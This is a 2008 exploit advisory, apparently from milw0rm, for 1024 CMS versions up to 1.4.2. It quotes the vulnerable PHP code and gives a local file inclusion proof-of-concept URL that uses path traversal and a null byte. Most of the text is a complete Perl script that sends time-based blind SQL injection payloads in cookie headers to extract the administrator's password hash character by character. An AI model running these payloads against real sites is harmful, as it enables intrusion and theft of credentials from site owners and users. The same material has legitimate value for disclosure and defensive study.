<html><head><title>1024 CMS <= 1.4.2 Local File Inclusion / Blind SQL Injection Exploit</title></head><pre># Author:	__GiReX__
# mySite:	girex.altervista.org
# Date:		13/04/2008 

# CMS: 		1024 CMS &lt;= 1.4.1 and 1.4.2 (beta)
# Site:		1024cms.com

# Bug1:		Local File Inclusion
# Need:		magic_quotes_gpc = Off / register_globals = On

# Bug2:		Cookie Blind SQL Injection 
# Exploit:	Admin Hash Retrieve Exploit
# Need:		magic_quotes_gpc = Off


# Bug1: Vuln Code: pages/print/default/ops/news.php
   
  &lt;?php
     if(!isset($_GET['id']) || !is_numeric($_GET['id'])) die(&quot;ID Not Set&quot;);
     include(&quot;./lang/&quot;.$lang.&quot;/news/default.php&quot;);

# $lang is unset so we can exploit through local file inclusion


# Include a local file in CMS directory
# PoC: [host]/[path]/pages/print/default/ops/news.php?id=1&amp;lang=../../../../../[local file]%00



# Bug2: Vuln Code: /includes/system.php: Lines 66-71

  if(!isset($_SESSION['logged']) &amp;&amp; (isset($_COOKIE['cookuid']) &amp;&amp; isset($_COOKIE['cookpass']) &amp;&amp;       
      isset($_COOKIE['cooktype']) &amp;&amp; isset($_COOKIE['cooklogged']))){
	 $_SESSION['logged'] = $_COOKIE['cooklogged'];
	 $_SESSION['user'] = $_COOKIE['cookuid'];
	 $_SESSION['type'] = $_COOKIE['cooktype'];

	$chk_comb = mysql_query(&quot;SELECT id, type, warning, banned FROM &quot;.$prefix.&quot;users 
        WHERE username='&quot;.$_SESSION['logged'].&quot;' AND password='&quot;.$_COOKIE['cookpass'].&quot;'&quot;) 
        or die(&quot;Cannot check combination: &quot;.mysql_error());

# We can exploit this vulnerable query editing our cookies and making a blind sql injection


###  Start Exploit  ###

#!/usr/bin/perl -w
# 1024 CMS &lt;= 1.4.2 (beta) Remote Blind SQL Injection
# Admin Hash Retrieve Exploit

use LWP::UserAgent;
use HTTP::Request;

if(not defined $ARGV[0])
{
	print &quot;usage: perl $0 [host] [path]\n&quot;;
	print &quot;example: perl $0 localhost /1024/\n&quot;;
	exit;
}

my $client =  new LWP::UserAgent;
my @cset   =  (48..57, 97..102); 
my $hash   =  undef;
 
my $host  = ($ARGV[0] =~ /^http:\/\//) ?  $ARGV[0]:  'http://' . $ARGV[0];
   $host .=  $ARGV[1] unless not defined $ARGV[1];

banner();
check_vuln($host) or die &quot;[-] Site not vulnerable: maybe magic_quotes_gpc = On\n\n&quot;;
syswrite(STDOUT, &quot;[+] Admin Hash: &quot;);

for($j = 1; $j &lt;= 32; $j++)
{  
    for($i = 0; $i &lt;= $#cset; $i++)
    {
        $pre_time = time();	
	
	 $rv = check_char($cset[$i], $j);
	 $post_time = time();	 
	
         if($post_time - $pre_time &gt; 3 and $rv)
	 {
	     $hash .= chr($cset[$i]); 
             syswrite(STDOUT, chr($cset[$i]), 1);
	     last;
	 }
    }
}

if(not defined $hash or length($hash) != 32)
{
     print STDOUT &quot;\n[-] Exploit mistake: please check the benchmark and the sql query\n\n&quot;;
}
else 
{
     print STDOUT &quot;\n[+] Exploit terminated\n\n&quot;;
}


sub banner
{
   print &quot;\n&quot;;
   print &quot;[+] 1024 CMS &lt;= 1.4.2 (beta) Remote Blind SQL Injection\n&quot;;
   print &quot;[+] Admin Hash Retrieve Exploit\n&quot;;
   print &quot;[+] Coded by __GiReX__\n&quot;;
   print &quot;\n&quot;;
}

sub check_vuln
{
  my $target = shift;

     $get = new HTTP::Request(GET, $target);
     $get-&gt;header(Cookie =&gt; &quot;cookpass=-1'; cookuid=0; cooktype=0; cooklogged=0; cookuser=0&quot;);

     $res = $client-&gt;request($get);
     
     if($res-&gt;is_success) 
     {
         return 1 if $res-&gt;as_string =~ /Cannot check combination/;
     }
     else
     {
	die &quot;[-] Invalid target : ${target}\n\n&quot;;
     }

  return 0;
}

sub check_char
{
  my ($char, $n) = @_;
   
    $get-&gt;header(Cookie =&gt;  'cookpass=-1\'+AND+'.
			    'CASE+WHEN(SELECT ASCII(SUBSTRING(password,'.$n.',1))+'.
			    'FROM+otatf_users+WHERE+id=1)='.$char.'+'.
                            'THEN+BENCHMARK(90000000,CHAR(0))+END#; '.
			    'cookuid=1; cooktype=1; cooklogged=1; cookuser=1'); 

    $res = $client-&gt;request($get);

  return $res-&gt;is_success;
}

# milw0rm.com [2008-04-13]</pre></html>